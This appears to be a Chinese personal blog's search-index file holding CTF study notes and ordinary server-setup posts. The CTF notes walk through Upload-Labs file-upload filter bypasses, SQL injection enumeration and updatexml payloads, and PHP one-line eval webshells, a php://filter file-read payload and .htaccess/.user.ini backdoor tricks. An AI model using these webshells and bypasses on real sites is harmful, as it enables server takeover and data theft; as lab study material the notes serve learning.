<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>CTF记录 Upload Labs Linux记录</title><url>/post/2023-04-28_ctf%E8%AE%B0%E5%BD%95-upload-labs-linux%E8%AE%B0%E5%BD%95/</url><categories><category><no value=/></categories><tags><tag><no value=/><tag><no value=/></tags><content type="html"><![CDATA[CTF-Upload-Labs-Linux记录
Pass-01 前端JS校验 解决方案： 直接运行checkFile=()=&gt;{return true}修改checkFile函数即可
Pass-02 后台MIME检查 解决方案： 修改POST数据包 Content-Type：image/jpeg 或者image/png 或 image/gif
Pass-03 后台后缀判定 解决方案： php修改为phtml后缀上传。
Pass-04 黑名单验证 .htaccess绕过 Pass-03的进阶！ 后台禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！
$deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;php1&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;pHp1&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 解决方案： 基本方法：上传.htaccess,将jpg作为php解析
AddHandler application/x-httpd-php .php5 .php3 .pht .phtml .phps .jpg 然后上传jpg一句话
Pass-05 黑名单验证，大小写绕过 $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 解决方案： 上传大写文件名
Pass-06 黑名单验证，空格绕过 $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 解决方案： 上传文件名加空格
Pass-07 黑名单验证，点号绕过 $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 解决方案： 上传文件名尾加.
Pass-08 黑名单验证，$DATA绕过 $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 解决方案： windows环境下有效，buuoj.cn提供环境无效。
php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 他的目的就是不检查后缀名。
Pass-09 黑名单验证 点+空格+点绕过 $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 解决方案： 上传文件名改为2.php. . deldot方法下 &ldquo;. .&ldquo;会变成&rdquo;. &quot; windows环境下直接访问2.php LINUX环境下访问2.php.%20
Pass-10 黑名单验证 双写绕过 $deny_ext = array(&#34;php&#34;,&#34;php5&#34;,&#34;php4&#34;,&#34;php3&#34;,&#34;php2&#34;,&#34;html&#34;,&#34;htm&#34;,&#34;phtml&#34;,&#34;pht&#34;,&#34;jsp&#34;,&#34;jspa&#34;,&#34;jspx&#34;,&#34;jsw&#34;,&#34;jsv&#34;,&#34;jspf&#34;,&#34;jtml&#34;,&#34;asp&#34;,&#34;aspx&#34;,&#34;asa&#34;,&#34;asax&#34;,&#34;ascx&#34;,&#34;ashx&#34;,&#34;asmx&#34;,&#34;cer&#34;,&#34;swf&#34;,&#34;htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&#34;&#34;, $file_name); 解决方案： 上传文件名改为2.pphphp
Pass-11 白名单验证 （GET型0x00截断） $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&#34;.&#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&#34;/&#34;.rand(10, 99).date(&#34;YmdHis&#34;).&#34;.&#34;.$file_ext; 线上实验不成功，因为PHP版本号为7.2.21。 设置上传路径为upload/2.php%00 ,2.php%00内容为了控制路径，上传文件后缀为白名单即可 例:test.jpg，保存后为/upload/2.php%00test.jpg，但服务端读取到%00时会自动结束，将文件内容保存至2.php中 ? PS:需要php的版本号低于5.3.29，且magic_quotes_gpc为关闭状态
Pass-12 白名单校验（POST型0x00截断） 同Pass-11 ，save_path改为POST数据
Pass-13 文件包含漏洞 图片马1 本题已经提示使用
header(&#34;Content-Type:text/html;charset=utf-8&#34;); $file = $_GET[&#39;file&#39;]; if(isset($file)){ include $file; }else{ show_source(__file__); } ?&gt; 直接上传图片马后，用include.php?file=upload/5020230428025600.jpg即可
Pass-14 文件包含漏洞 图片马2 同 Pass-13，区别在于图片马的判断不一样
Pass-15 文件包含漏洞 图片马3 同 Pass-13，区别在于图片马的判断不一样
Pass-16 文件包含漏洞 二次渲染 上传大图片，然后一句话换位置区块，直接二次渲染不删除一句话
Pass-17 条件竞争 需要爆破
]]></content></entry><entry><title>CTF记录 SQL注入</title><url>/post/2023-04-26_ctf%E8%AE%B0%E5%BD%95-sql%E6%B3%A8%E5%85%A5/</url><categories><category><no value=/></categories><tags><tag>CTF</tag><tag>SQL</tag></tags><content type="html"><![CDATA[CTF学习记录-SQL注入
MYSQL 常用命令 #当前用户 select user(); #当前使用的数据库 select datebase() ; #当前全部数据库名 select group_concat(schema_name) from information_schema.schemata; #x数据库下的表 select group_concat(table_name) from information_schema.tables where table_schema=&#39;x&#39;; #x数据库下的y表的列 select group_concat(column_name) from information_schema.columns where table_schema=&#39;x&#39; and table_name=&#39;y&#39; 堆叠注入 handler注入可以使用show命令和handler的情况下。
先试用show命令获取信息
show tables或show tables from database_name; — 显示当前数据库中所有表的名称。 show databases; — 显示mysql中所有数据库的名称。 show columns from table_name from database_name; 或show columns from database_name.table_name; — 显示表中列名称。 用table命令读取表
Handler table OPEN;Handler table read first;Handler table close 报错注入 updatexml函数
updatexml(xml_doument,XPath_string,new_value) 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据
实际使用中使用第二个参数。范例如下：
updatexml(1,concat(0x7e,version()),0) updatexml(1,concat(0x7e,database()),0) concat在需要的数据前面加上一个XPATH校验失败的参数 正常使用0x7e(~ 的16进制)
updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(%27geek%27))),1) 空格限制情况下可以用()替代
]]></content></entry><entry><title>CTF记录 PHP</title><url>/post/2023-04-25_ctf%E8%AE%B0%E5%BD%95-php/</url><categories><category><no value=/></categories><tags><tag>CTF</tag><tag>PHP</tag></tags><content type="html"><![CDATA[CTF学习记录-PHP出现以下处理方案
一句话木马 &lt;?php @eval($_POST[&#39;shell&#39;]);?&gt; &lt;script language=&#34;php&#34;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt; PHP LFI 漏洞 源代码如下
&lt;meta charset=&#34;utf8&#34;&gt; &lt;?php error_reporting(0); $file = $_GET[&#34;file&#34;]; if(stristr($file,&#34;php://input&#34;) || stristr($file,&#34;zip://&#34;) || stristr($file,&#34;phar://&#34;) || stristr($file,&#34;data:&#34;)){ exit(&#39;hacker!&#39;); } if($file){ include($file); }else{ echo &#39;&lt;a href=&#34;?file=flag.php&#34;&gt;tips&lt;/a&gt;&#39;; } ?&gt; 使用PHP伪协议将flag.php文件转换成base64 格式
php://filter/read=convert.base64-encode/resource=flag.php PHP 反序列化 unserialize()函数 php在unserialize()函数中将字符串恢复为对象时会调用PHP魔术方法
方法 作用 __construct() 构造函数，实例化类时自动调用 __destruct() 析构函数，销毁对象时自动调用 __sleep() 序列化对象时自动调用 __wakeup() 反序列化对象时自动调用 __toString() 类被当成字符串时自动调用 使用以下代码可以产生渗透需要的序列化字符串
&lt;?php class Name{ private $username = &#39;admin&#39;; private $password = &#39;100&#39;; } $object = new Name(); var_dump(serialize($object)) ; ?&gt; O:4:&ldquo;Name&rdquo;:2:{s:14:&quot; Name username&quot;;s:5:&ldquo;admin&rdquo;;s:14:&quot; Name password&quot;;s:3:&ldquo;100&rdquo;;}
class 属性类型 需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化。
使用public修饰进行序列化后，变量长度不变，正常输出。 使用private修饰进行序列化后，序列化时: \x00 + [私有成员所在类名] + \x00 [变量名] 使用protected修饰进行序列化后，序列化时：\x00 + * + \x00 + [变量名] PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过 利用PHP的字符串解析特性绕过Waf 链接 利用.htaccess和图片上传木马 .htaccess
SetHandler application/x-httpd-php 利用.user.ini上传\隐藏后门 参考链接 条件：
1、服务器脚本语言为PHP 2、服务器使用CGI／FastCGI模式 3、上传目录下要有可执行的php文件 GIF89a //绕过exif_imagetype() auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。 auto_append_file=a.jpg //解析后进行包含 ]]></content></entry><entry><title>关于 Hugo NexT 组织</title><url>/about.html</url><categories/><tags/><content type="html">Hugo NexT 组织是由众多喜爱 NexT 主题及风格的世界各地友人共同组建而成，为的就是让这个主题继续在 Hugo 引擎中也能得到发扬光大，在此也欢迎你的加入！
我们的愿景 延续 NexT 经典的黑白调搭配，保持简单的易用性及强大的功能。
使用反馈 加入 GitHub Discussions 或 Gitter 在线讨论 🍻 GitHub Issues 提交错误报告 🐛 GitHub Feature 表新功能的想法 ✨ 同时国内用户也可加入 QQ 群交流： 604710815</content></entry><entry><title>安装签到网站</title><url>/post/2020-11-15_%E5%AE%89%E8%A3%85%E7%AD%BE%E5%88%B0%E7%BD%91%E7%AB%99/</url><categories><category><no value=/></categories><tags><tag><no value=/><tag><no value=/></tags><content type="html">#安装签到网站 https://github.com/AragonSnow/qiandao 1. 下载docker-ce的repo curl https://download.docker.com/linux/centos/docker-ce.repo -o /etc/yum.repos.d/docker-ce.repo 2. 安装依赖 yum install https://download.docker.com/linux/fedora/30/x86_64/stable/Packages/containerd.io-1.2.6-3.3.fc30.x86_64.rpm 3. 安装docker-ce dnf -y install docker-ce docker-ce-cli --nobest 4.启动 docker systemctl start docker 5.查看 docker 版本信息 docker -v 6.设置开机自动启动 systemctl enable --now docker 安装docker容器 docker run -d --restart=always --name qiandao -p 12345:80 -v $(pwd)/qiandao/config:/usr/src/app/config asdaragon/qiandao 安装完成后注册账号 docker exec -it qiandao /bin/bash python ./chrole.py 刚才注册的邮箱 admin 设置为管理员</content></entry><entry><title>centos8安装seafile</title><url>/post/2020-11-10_centos8%E5%AE%89%E8%A3%85seafile/</url><categories><category>web</category></categories><tags><tag>seafile</tag><tag>centos</tag></tags><content type="html">centos8安装seafile
centos8 安装seafile 小记 1.安装centos 首先安装centos8，基本的配置操作。
升级centos内核 操作略
//升级系统 yum -y update /安装 wget yum -y install wget
设置为阿里yum源
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo yum clean all //清除原有yum缓存 yum makecache //生成新的缓存 安装必要软件
yum install lrzsz systat tree vim nmap unzip dos2unix nc lsof dnf group install &amp;#34;Development Tools&amp;#34; 2.准备工作 yum install python3 python3-setuptools python3-pip python3-ldap -y //根据需要更新pip源,略 ~/.pip/pip.conf ####升级pip版本（不升级安装依赖包可能会报错，提示文件缺失） pip3 install --upgrade pip ###安装python包 pip3 install --timeout=3600 Pillow pylibmc captcha jinja2 sqlalchemy psd-tools django-pylibmc django-simple-captcha 下载一键安装seafile脚本
wget https://cdn.jsdelivr.net/gh/haiwen/seafile-server-installer-cn@master/seafile-server-7.1-centos-amd64-http pro下载地址：https://download.seafile.com/d/6e5297246c/?p=%2Fpro&amp;amp;mode=list 放置seafile-pro-server_7.._x86-64_CentOS.tar.gz到/opt 路径
3.开始安装 bash seafile-server-7.1-centos-amd64-http 7.1.8 选择pro 等待安装完成 4.注意事项 4.1 目前7.1在虚拟机下，搜索服务基本会内存溢出 安装完后请注意先关闭seafile服务
systemctl stop seafile systemctl stop seahub 及时修改seafevents.conf关闭搜索服务。
4.2 7.1以上office预览需要安装Libreoffice 新版。 详见 https://cloud.seafile.com/published/seafile-manual-cn/deploy_pro/office_documents_preview.md#user-content-7.1%20%E4%BB%A5%E5%8F%8A%E4%B9%8B%E5%90%8E%E7%89%88%E6%9C%AC 5.内网穿透 服务器建立在局域网内，使用免费的Sakura FRP进行内网穿透。 网址：https://www.natfrp.com 注册账号根据说明建立服务。</content></entry><entry><title>Git仓库删除所有提交历史记录</title><url>/post/2018-06-29_git%E4%BB%93%E5%BA%93%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/</url><categories><category>git</category></categories><tags><tag>git</tag></tags><content type="html">把旧项目提交到git上，但是会有一些历史记录，这些历史记录中可能会有项目密码等敏感信息。如何删除这些历史记录，形成一个全新的仓库，并且保持代码不变呢？
git checkout --orphan latest_branch git add -A git commit -am &amp;#34;commit message&amp;#34; git branch -D main git branch -m main git push -f origin main</content></entry><entry><title>hexo建站总结</title><url>/post/2018-06-28_hexo%E5%BB%BA%E7%AB%99%E6%80%BB%E7%BB%93/</url><categories><category>web</category></categories><tags><tag>自定义</tag><tag>个性化</tag><tag>布局</tag></tags><content type="html"><![CDATA[前言 最近突然想整理下技术的思路，刚好看到码云也有Gitee Pages 服务,支持Jekyll、Hugo、Hexo。试验了下决定选用hexo搭建博客。
软件准备 以下均为在windows环境下操作，首先先安装以下程序
git node.js git设置 $ git config --global user.name &#34;fjcqv&#34; $ git config --global user.email fjcqv@qq.com 有必要可设置git使用ssh秘钥，这样可以免登录。
npm设置 //设置npm库位置 npm config set prefix &#34;D:/Program Files/nodejs/npm_global&#34; npm config set cache &#34;D:/Program Files/nodejs/npm_cache&#34; //在中国，中国，中国，你应该设置淘宝镜像来加速下载。 npm config set registry &#34;https://registry.npm.taobao.org/&#34; npm config set electron_mirror &#34;https://npm.taobao.org/mirrors/electron/&#34; 使用npm安装Hexo npm install hexo-cli -g hexo init blog cd blog npm install hexo server 然后访问localhost:4000就能看到雏形。
选择hexo主题 这边我们使用nexT作为主题。 先从https://github.com/theme-next/hexo-theme-next fork到自己仓库。 然后在站点根目录终端输入 //创建子模块 git submodule add &#34;git@github.com:fjcqv/hexo-theme-next.git&#34; &#34;themes/next&#34; //或者以下命令，个人觉得上面的好处是修改主题维护方便点。 git clone https://github.com/theme-next/hexo-theme-next themes/next 打开站点配置文件_config.yml， 找到 theme 字段，并将其值更改为 next。 # 扩展 ## 插件: https://hexo.io/plugins/ ## 主题: https://hexo.io/themes/ theme: next 重新生成 hexo clean //清除缓存 hexo g //重新生成代码 hexo s //部署到本地 //然后打开浏览器访问 localhost:4000 查看效果 部署 选择部署仓库 本文选择码云，毕竟在国内，访问速度快点 建立一个与自己个性地址同名的项目 配置 打开站点配置文件_config.yml， 找到 deploy 字段修改。
# 部署 ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: git@gitee.com:cqv/cqv.git branch: master message: &#39;站点更新:{{now(&#34;YYYY-MM-DD HH:mm:ss&#34;)}}&#39; 安装插件并部署 npm install hexo-deployer-git --save hexo d 开启pages服务 码云需要在项目选择gitee pages服务将其开启，才能访问。
]]></content></entry><entry><title>站点示例</title><url>/flinks.html</url><categories/><tags/><content type="html">如想交换本站友情链接，请在评论区留下你的站点信息，格式参考如下：
- name: Hugo-NexT desc: Hugo NexT 官方预览网站。 avatar: https://hugo-next.eu.org/imgs/hugo_next_avatar.png link: https://hugo-next.eu.org</content></entry></search>